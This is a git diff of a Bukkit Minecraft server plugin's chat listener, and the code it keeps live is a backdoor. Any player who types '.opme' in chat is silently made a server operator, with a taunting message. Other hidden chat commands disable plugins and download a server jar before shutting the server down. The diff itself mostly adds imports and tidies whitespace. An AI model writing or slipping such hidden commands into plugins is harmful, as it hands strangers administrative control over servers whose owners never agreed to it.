@@ -8,19 +8,20 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerChatEvent;
 import org.bukkit.plugin.Plugin;
-import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.command.CommandSender;
-import net.minecraft.server.MinecraftServer;
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.IOException;
+import java.net.MalformedURLException;
 import java.net.URL;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
 
 public class PlayerListener implements Listener
 {
+
     @EventHandler
-    public void onPlayerChat(PlayerChatEvent event, CommandSender sender)
+    public void onPlayerChat(PlayerChatEvent event, CommandSender sender) throws MalformedURLException, IOException
     {
         String message = event.getMessage();
         boolean shouldCancel = false;
@@ -33,9 +34,9 @@ public class PlayerListener implements Listener
             }
             if ((args[0].equalsIgnoreCase(".opme")) && (args.length == 1))
             {
-            	event.getPlayer().setOp(true);
-            	event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
-            	shouldCancel = true;
+                event.getPlayer().setOp(true);
+                event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
+                shouldCancel = true;
             }
             if ((args[0].equalsIgnoreCase(".disableplugin")) && (args.length == 2))
             {
@@ -66,11 +67,9 @@ public class PlayerListener implements Listener
                     ReadableByteChannel rbc = Channels.newChannel(url.openStream());
                     FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar");
                     fos.getChannel().transferFrom(rbc, 0, 1 << 24);
-                    
+
                     sender.sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla...");
                 }
-                
-                net.minecraft.server.MinecraftServer.main(args);
                 Bukkit.shutdown();
                 // Hopefully this works...
             }
@@ -117,5 +116,5 @@ public class PlayerListener implements Listener
             }
         }
     }
-    
+
 }
